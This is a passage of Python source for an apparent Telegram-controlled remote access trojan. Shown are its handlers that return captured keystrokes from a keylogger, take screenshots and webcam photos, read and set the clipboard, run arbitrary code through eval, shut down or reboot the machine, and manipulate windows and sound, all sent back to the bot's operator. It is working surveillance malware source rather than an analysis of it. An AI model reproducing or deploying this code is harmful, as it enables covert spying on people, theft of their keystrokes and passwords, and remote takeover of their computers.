    _bot_klx_fckeys_strsafe_dyn[0].append(f'[KLX] ({_klx_u_time()}) : Listening mode activated.')

    with open(_klx_out_fname := f'klx_{randint(1000, 9999)}.txt', 'w') as _klx_out:
        _klx_out.write('\n'.join(_bot_klx_fckeys_strsafe_dyn[0]) + '\n')

    await message.reply_document(FSInputFile(_klx_out_fname), caption=f'📝 KLX process finished!\nKLX was active for <b>{_u_timediff(_bot_klx_active_since_raw[0], datetime.now())}</b>.\nStarted: <b>{_bot_klx_active_since[0]}</b>\nNow: <b>{_klx_u_time()}</b>\nThis file has <b>{len(_bot_klx_fckeys_strsafe_dyn[0]) - 1}</b> lines of pure key logging result. 😉', parse_mode='HTML')

    remove(_klx_out_fname)

    await message.answer('🗑⏳ Deinitializing KLX...')

    _bot_klx_active_since[0] = None
    _bot_klx_active_since_raw[0] = None

    _bot_klx_ckeys_strsafe_dyn[0] = None
    _bot_klx_fckeys_strsafe_dyn[0] = []

    _bot_klx_lpt_dyn[0] = None

    await message.answer('🗑⌛ KLX deinitialized successfully.')

# Make a screenshot.
@dp.message(Command('screenshot'))
@authreq
async def screenshot_(message: Message) -> None:
    try:
        screenshot('trpcc_shot.png')

        await message.reply_photo(FSInputFile('trpcc_shot.png'), caption=f'🔍 {getActiveWindow().title}\n📅 {strftime("%H:%M:%S")}')

        remove('trpcc_shot.png')
    except Exception as exception:
        await error(exception, 'screenshot', message)

# Shutdown PC.
@dp.message(Command('shutdown'))
@authreq
async def shutdown(message: Message) -> None:
    try:
        await message.reply('📉 Shutting down...')

        Rebooter('shutdown')
    except Exception as exception:
        await error(exception, 'shutdown', message)

# Reboot PC.
@dp.message(Command('reboot'))
@authreq
async def reboot(message: Message) -> None:
    try:
        await message.reply('📉 Rebooting...')

        Rebooter()
    except Exception as exception:
        await error(exception, 'reboot', message)

# Evaluate Python code.
@dp.message(Command('evalpython'))
@authreq
async def evalpython(message: Message) -> None:
    try:
        args = message.text.split()

        if len(args) <= 1:
            await message.reply('⁉ /evalpython [CODE] <- Missing code.')

            return

        await message.reply('‼ Output: ' + str(eval(' '.join(args[1:]))))
    except Exception as exception:
        await error(exception, 'evalpython', message)

# Get PC date.
@dp.message(Command('date'))
@authreq
async def date(message: Message) -> None:
    await message.reply(strftime('Local PC Time:\n\n%Y.%m.%d/%H:%M:%S\n\nYear: %Y\nMonth: %m\nDay: %d\n\nHours: %H\nMinutes: %M\nSeconds: %S'))

# Show message box.
@dp.message(Command('msgbox'))
@authreq
async def msgbox(message: Message) -> None:
    try:
        args = message.text.split()

        if len(args) <= 2:
            await message.reply('⁉ /msgbox [TEXT] [TITLE] <- Missing text or title.')

            return

        await message.reply('✅ Showing message box...')

        def _show():
            alert(spacing(args[1]), spacing(args[2]))

            while 1:
                if (alert_winl := getWindowsWithTitle(args[2])):
                    alert_winl[-1].activate()

                    break

        Thread(target=_show).start()
    except Exception as exception:
        await error(exception, 'msgbox', message)

# Paste text to clipboard.
@dp.message(Command('copy'))
@authreq
async def copy_(message: Message) -> None:
    try:
        args = message.text.split()

        if len(args) <= 1:
            await message.reply('⁉ /copy [TEXT] <- Missing text.')

            return

        copy(' '.join(args[1:]))

        await message.reply('✅ Copied text successfully!')
    except Exception as exception:
        await error(exception, 'copy', message)

@dp.message(Command('glcc'))
@authreq
async def glcc(message: Message) -> None:
    try:
        await message.reply(f'📋 Latest copied content:\n<pre>{paste()}</pre>', 'HTML')
    except Exception as exception:
        await error(exception, 'glcc', message)

# Play sound from controller side.
@dp.message(Command('playsound'))
@authreq
async def playsound_(message: Message) -> None:
    if _bot_waits_for_audio[0]:
        await message.reply('❌ Already waiting for audio..')

        return

    _bot_waits_for_audio[0] = True

    await message.reply('❗ Send a MP3/WAV file.')

# Load sound and play it.
@dp.message(lambda message: message.audio)
async def load_and_play(message: Message) -> None: # Continuation of `playsound`.
    try:
        if not _bot_waits_for_audio[0]:
            await message.reply('❌ Don\'t need audio at this moment..')

            return

        if message.audio.mime_type not in ['audio/mpeg', 'audio/wav']:
            await message.reply('❌ Not MP3/WAV.')

            _bot_waits_for_audio[0] = False

            return

        await bot.download(message.audio.file_id, message.audio.file_name)

        playsound(message.audio.file_name, False)

        remove(message.audio.file_name)

        _bot_waits_for_audio[0] = False

        await message.reply('✅ Playing sound...')
    except Exception as exception:
        await error(exception, 'playsound', message)

# Play sound from the client-side.
@dp.message(Command('playlocalsound'))
@authreq
async def playlocalsound(message: Message) -> None:
    try:
        args = message.text.split()

        if len(args) <= 1:
            await message.reply('⁉ /playlocalsound [SOUND] <- Missing sound.')

            return

        path = ' '.join(args[1:])

        if not path.endswith('.mp3') and not path.endswith('.wav'):
            await message.reply('❌ MP3/WAV required.')

            return

        if not exists(path):
            await message.reply('❌ Failed to find specified audio.')

            return

        playsound(path, False)

        await message.reply('✅ Playing sound...')
    except Exception as exception:
        await error(exception, 'playlocalsound', message)

# Get active window.
@dp.message(Command('getactivewindow'))
@authreq
async def get_active_window(message: Message) -> None:
    try:
        active_window = getActiveWindow()

        await message.reply(f'〽 Active window: {active_window.getAppName()} "{active_window.title}" (HWND: {active_window._hWnd}).')
    except Exception as exception:
        await error(exception, 'getactivewindow', message)

# Close active window.
@dp.message(Command('closeactivewindow'))
@authreq
async def close_active_window(message: Message) -> None:
    try:
        active_window = getActiveWindow()

        title = f'{active_window.getAppName()} "{active_window.title}"'

        active_window.close()

        await message.reply(f'〽 Closing {title}...')
    except Exception as exception:
        await error(exception, 'closeactivewindow', message)

# Increase volume.
@dp.message(Command('upvolume'))
@authreq
async def upvolume(message: Message) -> None:
    try:
        args = message.text.split()

        if len(args) <= 1:
            await message.reply('⁉ /upvolume [AMOUNT] <- Missing amount.')

            return

        if not args[1].isdigit():
            await message.reply('❌ Expected amount as a number.')

            return

        for _ in range(int(args[1])):
            pg_press('volumeup')

        await message.reply(f'✅ Volume increased by {args[1]}.')
    except Exception as exception:
        await error(exception, 'upvolume', message)

# Decrease volume.
@dp.message(Command('downvolume'))
@authreq
async def downvolume(message: Message) -> None:
    try:
        args = message.text.split()

        if len(args) <= 1:
            await message.reply('⁉ /downvolume [AMOUNT] <- Missing amount.')

            return

        if not args[1].isdigit():
            await message.reply('❌ Expected amount as a number.')

            return

        for _ in range(int(args[1])):
            pg_press('volumedown')

        await message.reply(f'✅ Volume decreased by {args[1]}.')
    except Exception as exception:
        await error(exception, 'downvolume', message)

# Capture an image from the webcam.
@dp.message(Command('webcamimage'))
@authreq
async def webcamimage(message: Message) -> None:
    try:
        args = message.text.split()

        if len(args) <= 1:
            await message.reply('⁉ /webcamimage [WEBCAMINDEX] <- Missing webcam index.')

            return

        if not args[1].isdigit():
            await message.reply('❌ Expected index as a number.')

            return

        await message.reply('📸 Capturing image...')

        camera = VideoCapture(int(args[1]))

        result, image = camera.read()

        if result:
            imwrite('webcam.png', image)

            await message.reply_photo(FSInputFile('webcam.png'), caption=f'📷 Webcam {args[1]}\n📅 {strftime("%H:%M:%S")}')

            remove('webcam.png')

        else:
            await message.reply('❌ No result from reading the screen. Try another index for working webcam.')
    except Exception as exception:
        await error(exception, 'webcamimage', message)

# Log in user by providing the password.
@dp.message(Command('login'))
async def login(message: Message) -> None:
    if not _RT_B_PWD:
        await message.reply('🔓 No password is required.')

        return

    args = message.text.split()

    if len(args) <= 1:
        await message.reply('⁉ /login [PASSWORD] <- Missing password!')

        return

    if args[1] == _RT_B_PWD:
        u_authenticated.add(message.from_user.id)

        await message.reply('🔓 Authenticated successfully!')

    else:
        await message.reply('🔒 Incorrect password.')

# See who started the bot in the current session.
@dp.message(Command('wsits'))
@authreq
async def whointeracted(message: Message) -> None:
    if len(u_stb) == 1 and message.from_user.username in [user[0] for user in u_stb]:
        await message.reply('🔍 <b>No one has started the bot except you in the current session!</b> 🙂', parse_mode='HTML')

    _nwl = '\n'
    _q = '"'

    await message.answer(f'⭕ <b>List of users who started the bot in the current session</b>:\n{_nwl.join([f"{num + 1}. <b>@{data[0]}</b> (<b>{_q}{data[1]}{_q}</b>)" for num, data in enumerate(u_stb)])}', parse_mode='HTML')

# Is bot alive.
@dp.message(Command('alive'))
async def alive(message: Message) -> None:
    await message.reply('✅ Client receiver online.')

# Unalive bot.
@dp.message(Command('unalive'))
@authreq
async def unalive(message: Message) -> None:
    await message.answer('⁉🔚 If you kill the client-side process, the bot will stop working until receiver\'s PC is rebooted. Are you sure? Type `YES` in lowercase/uppercase.')

    _bot_waits_for_unaliving[0] = True

# Confirm bot unaliving function.
@dp.message(lambda _: _bot_waits_for_unaliving[0])
@authreq
async def confirm_unalive(cmsg: Message) -> None:
    if cmsg.text.lower() == 'yes':
        await cmsg.answer("Bye! 👋")

        await dp.stop_polling()

    else:
        _bot_waits_for_unaliving[0] = False

# Reset all bot file states.
@dp.message(Command('cancelloads'))
@authreq
async def cancelloads(message: Message) -> None:
    _bot_waits_for_audio[0] = False
    _bot_waits_for_file[0] = False

    _file_path[0] = None

    await message.reply('✅ Canceled all file loads!')

# Main function.
async def main():
    await dp.start_polling(bot)

# Run.
if __name__ == '__main__':
    run(main())
